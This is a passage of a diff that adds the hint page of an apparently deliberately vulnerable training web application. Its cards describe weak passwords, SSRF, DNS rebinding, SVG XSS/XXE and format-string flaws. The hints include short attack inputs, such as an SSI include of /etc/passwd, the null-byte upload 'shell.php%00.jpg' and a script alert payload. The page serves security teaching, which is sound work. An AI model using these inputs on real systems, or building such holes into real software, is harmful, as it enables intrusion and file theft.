+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/brute-force-endpoint</span> <span class="endpoint-badge">ALL ENDPOINTS</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔓</span>
+                    <h2 class="vuln-title">Weak Password Policy</h2>
+                </div>
+                <div class="vuln-description">
+                    No password requirements. "a" is valid password. No complexity checks.
+                </div>
+                <div class="hint-box">
+                    /api/register accepts any password. Database shows: "password123", "admin", "123456"
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/register</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🌀</span>
+                    <h2 class="vuln-title">Unicode Normalization Bypass</h2>
+                </div>
+                <div class="vuln-description">
+                    Different Unicode representations of same character. Bypass filters with ℕ𝕌𝕃𝕃
+                </div>
+                <div class="hint-box">
+                    /api/normalize shows how characters change. Use to bypass blocklists and WAFs.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/normalize</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">⚡</span>
+                    <h2 class="vuln-title">Server-Side Includes (SSI)</h2>
+                </div>
+                <div class="vuln-description">
+                    <!--#include file=""--> directives processed. Include arbitrary files.
+                </div>
+                <div class="hint-box">
+                    /api/ssi renders SSI directives. Try <!--#include file="/etc/passwd"-->
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/ssi</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity low">LOW</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🌐</span>
+                    <h2 class="vuln-title">DNS Rebinding</h2>
+                </div>
+                <div class="vuln-description">
+                    Domain resolves to public IP then switches to internal. Bypass SSRF protections.
+                </div>
+                <div class="hint-box">
+                    /api/internal-network shows internal services. Use DNS rebinding to access them.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/internal-network</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">↪️</span>
+                    <h2 class="vuln-title">SSRF via Redirect</h2>
+                </div>
+                <div class="vuln-description">
+                    Follows redirects without validation. Chain SSRF through legitimate domains.
+                </div>
+                <div class="hint-box">
+                    /api/follow-redirect and /api/external-redirect follow any URL. Redirect to internal IPs.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/follow-redirect</span> <span class="endpoint-badge">GET /api/external-redirect</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity critical">CRITICAL</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🎬</span>
+                    <h2 class="vuln-title">SVG XSS / XXE</h2>
+                </div>
+                <div class="vuln-description">
+                    SVG files can contain JavaScript and XML entities. Upload for XSS/XXE.
+                </div>
+                <div class="hint-box">
+                    /api/upload-svg renders SVG inline. Embed &lt;script&gt;alert(1)&lt;/script&gt; or XXE entities.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/upload-svg</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔢</span>
+                    <h2 class="vuln-title">Format String Vulnerabilities</h2>
+                </div>
+                <div class="vuln-description">
+                    String formatting without sanitization. %s, %d, %x format specifiers exploitable.
+                </div>
+                <div class="hint-box">
+                    /api/format processes format strings. Try %s, %p, %n to leak/write memory.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/format</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">⚫</span>
+                    <h2 class="vuln-title">Null Byte Injection</h2>
+                </div>
+                <div class="vuln-description">
+                    %00 truncates strings in some contexts. Bypass file extension checks.
+                </div>
+                <div class="hint-box">
+                    /api/file-read might be vulnerable. Try shell.php%00.jpg to bypass .jpg validation.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/file-read</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔍</span>
+                    <h2 class="vuln-title">Stack Traces in Production</h2>
+                </div>
+                <div class="vuln-description">
+                    Full error stack traces reveal code structure, file paths, dependencies.
+                </div>
+                <div class="hint-box">
+                    /api/error throws exception with full stack. Global error handler leaks everything.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/error</span></p>
+            </div>
+        </div>
+        
+        <div class="warning-banner" style="margin-top: 80px;">
+            <h2>🎓 LEARNING PATH</h2>
+            <p>Start with SQL Injection and IDOR - these are easier to exploit.</p>
+            <p>Then progress to XSS, Command Injection, and SSTI.</p>
+            <p>Advanced: XXE, SSRF, Race Conditions, and Business Logic Flaws.</p>
+            <p><strong>Remember: Understanding > Exploitation</strong></p>
+        </div>
+        
+        <div style="text-align: center; margin: 60px 0 40px; color: #0ff; font-size: 1.2rem;">
+            <p>💀 Good luck, hacker. Trust no one. Verify everything. 💀</p>
+        </div>
+    </div>
+    
+    <script>
+        function toggleExpand(btn) {
+            const content = btn.nextElementSibling;
+            if (content.classList.contains('active')) {
+                content.classList.remove('active');
+                btn.textContent = 'Show More Hints';
+            } else {
+                content.classList.add('active');
+                btn.textContent = 'Show Less';
+            }
+        }
+    </script>
+</body>
+</html>
